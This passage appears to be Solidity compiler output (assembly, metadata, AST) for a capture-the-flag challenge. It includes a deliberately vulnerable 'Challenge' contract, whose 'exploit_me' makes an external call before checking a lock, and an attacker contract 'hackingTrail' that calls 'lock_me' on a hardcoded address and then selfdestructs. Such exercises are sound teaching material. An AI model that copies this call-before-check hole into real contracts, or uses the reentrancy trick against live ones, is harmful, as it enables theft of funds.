											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 741,
											"end": 783,
											"name": "PUSH",
											"source": 0,
											"value": "798349E06C67272465123B91BD88C5D19B8C7878"
										},
										{
											"begin": 719,
											"end": 784,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 719,
											"end": 784,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 719,
											"end": 729,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 719,
											"end": 784,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 719,
											"end": 784,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 719,
											"end": 784,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 711,
											"end": 820,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 711,
											"end": 820,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 898,
											"end": 918,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 631,
											"end": 673,
											"name": "PUSH",
											"source": 0,
											"value": "CD7AB80DA7C893F86FA8DEDDF862B74D94F4478E"
										},
										{
											"begin": 898,
											"end": 946,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 898,
											"end": 946,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 957,
											"end": 966,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 974,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 957,
											"end": 974,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 957,
											"end": 974,
											"name": "PUSH",
											"source": 0,
											"value": "4C228CC7"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 957,
											"end": 976,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 957,
											"end": 976,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1008,
											"end": 1050,
											"name": "PUSH",
											"source": 0,
											"value": "798349E06C67272465123B91BD88C5D19B8C7878"
										},
										{
											"begin": 987,
											"end": 1052,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 987,
											"end": 1052,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 987,
											"end": 1052,
											"name": "SELFDESTRUCT",
											"source": 0
										},
										{
											"begin": 7,
											"end": 176,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 7,
											"end": 176,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 91,
											"end": 102,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 125,
											"end": 131,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 120,
											"end": 123,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 113,
											"end": 132,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 165,
											"end": 169,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 160,
											"end": 163,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 156,
											"end": 170,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 141,
											"end": 170,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 141,
											"end": 170,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 182,
											"end": 363,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 182,
											"end": 363,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 322,
											"end": 355,
											"name": "PUSH",
											"source": 1,
											"value": "6C6F6C20686F772064696420796F75206576656E2066696E6420746869733F00"
										},
										{
											"begin": 318,
											"end": 319,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 310,
											"end": 316,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 306,
											"end": 320,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 299,
											"end": 356,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 182,
											"end": 363,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 182,
											"end": 363,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 369,
											"end": 735,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 369,
											"end": 735,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 511,
											"end": 514,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 599,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 596,
											"end": 598,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 591,
											"end": 594,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 532,
											"end": 599,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 532,
											"end": 599,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 532,
											"end": 599,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 532,
											"end": 599,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 525,
											"end": 599,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 525,
											"end": 599,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 608,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 697,
											"end": 700,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 608,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 608,
											"end": 701,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 608,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 608,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 726,
											"end": 728,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 721,
											"end": 724,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 717,
											"end": 729,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 710,
											"end": 729,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 710,
											"end": 729,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 369,
											"end": 735,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 369,
											"end": 735,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 369,
											"end": 735,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 369,
											"end": 735,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 741,
											"end": 1160,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 741,
											"end": 1160,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 907,
											"end": 911,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 945,
											"end": 947,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 934,
											"end": 943,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 930,
											"end": 948,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 922,
											"end": 948,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 922,
											"end": 948,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 994,
											"end": 1003,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 988,
											"end": 992,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 984,
											"end": 1004,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 980,
											"end": 981,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 969,
											"end": 978,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 965,
											"end": 982,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 958,
											"end": 1005,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1148,
											"end": 1152,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1022,
											"end": 1153,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1022,
											"end": 1153,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1022,
											"end": 1153,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1014,
											"end": 1153,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1014,
											"end": 1153,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 741,
											"end": 1160,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 741,
											"end": 1160,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 741,
											"end": 1160,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 741,
											"end": 1160,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"hackTrail()": "157bca60"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"hackTrail\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"hackingTrail\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0x36d0c4bd3bfe96d3bdcbe157641aada3bc3761e847ad5d3400c4de136ed002ed\",\"urls\":[\"bzz-raw://f3673e42d528ae77cf6c128eaaeeb2f64ac482d56c3b182a91e320ac972722e6\",\"dweb:/ipfs/QmdxgjzgCk8kNdMxxgghwEBLNt3mQnVgAHBcFym7DDPExC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> trailOfBits.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "trailOfBits.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> trailOfBits.sol:18:9:\n   |\n18 |         msg.sender.call(\"\");\n   |         ^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 424,
					"file": "trailOfBits.sol",
					"start": 405
				},
				"type": "Warning"
			}
		],
		"sources": {
			"trailOfBits.sol": {
				"ast": {
					"absolutePath": "trailOfBits.sol",
					"exportedSymbols": {
						"Challenge": [
							52
						],
						"IChallenge": [
							10
						],
						"hackingTrail": [
							101
						]
					},
					"id": 102,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"0.8",
								".10"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IChallenge",
							"contractDependencies": [],
							"contractKind": "interface",
							"fullyImplemented": false,
							"id": 10,
							"linearizedBaseContracts": [
								10
							],
							"name": "IChallenge",
							"nameLocation": "148:10:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"functionSelector": "548853a0",
									"id": 6,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "exploit_me",
									"nameLocation": "174:10:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "winner",
												"nameLocation": "193:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 6,
												"src": "185:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "185:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "184:16:0"
									},
									"returnParameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "209:0:0"
									},
									"scope": 10,
									"src": "165:45:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "4c228cc7",
									"id": 9,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "lock_me",
									"nameLocation": "225:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "232:2:0"
									},
									"returnParameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "243:0:0"
									},
									"scope": 10,
									"src": "216:28:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 102,
							"src": "138:109:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Challenge",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 52,
							"linearizedBaseContracts": [
								52
							],
							"name": "Challenge",
							"nameLocation": "260:9:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "a2fb1175",
									"id": 13,
									"mutability": "mutable",
									"name": "winners",
									"nameLocation": "295:7:0",
									"nodeType": "VariableDeclaration",
									"scope": 52,
									"src": "278:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_array$_t_address_$dyn_storage",
										"typeString": "address[]"
									},
									"typeName": {
										"baseType": {
											"id": 11,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "278:7:0",
											"stateMutability": "nonpayable",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"id": 12,
										"nodeType": "ArrayTypeName",
										"src": "278:9:0",
										"typeDescriptions": {
											"typeIdentifier": "t_array$_t_address_$dyn_storage_ptr",
											"typeString": "address[]"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 15,
									"mutability": "mutable",
									"name": "lock",
									"nameLocation": "314:4:0",
									"nodeType": "VariableDeclaration",
									"scope": 52,
									"src": "309:9:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 14,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "309:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 42,
										"nodeType": "Block",
										"src": "369:120:0",
										"statements": [
											{
												"expression": {
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 20,
														"name": "lock",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "380:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "66616c7365",
														"id": 21,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "387:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"src": "380:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 23,
												"nodeType": "ExpressionStatement",
												"src": "380:12:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "",
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "421:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"expression": {
																"id": 24,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "405:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 27,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "405:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 28,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"src": "405:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 30,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "405:19:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 31,
												"nodeType": "ExpressionStatement",
												"src": "405:19:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 33,
															"name": "lock",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "445:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 32,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "437:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 34,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "437:13:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 35,
												"nodeType": "ExpressionStatement",
												"src": "437:13:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 39,
															"name": "winner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 17,
															"src": "474:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"id": 36,
															"name": "winners",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 13,
															"src": "461:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_array$_t_address_$dyn_storage",
																"typeString": "address[] storage ref"
															}
														},
														"id": 38,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "push",
														"nodeType": "MemberAccess",
														"src": "461:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_arraypush_nonpayable$_t_array$_t_address_$dyn_storage_ptr_$_t_address_$returns$__$bound_to$_t_array$_t_address_$dyn_storage_ptr_$",
															"typeString": "function (address[] storage pointer,address)"
														}
													},
													"id": 40,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "461:20:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 41,
												"nodeType": "ExpressionStatement",
												"src": "461:20:0"
											}
										]
									},
									"functionSelector": "548853a0",
									"id": 43,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "exploit_me",
									"nameLocation": "336:10:0",
									"nodeType": "FunctionDefinition",
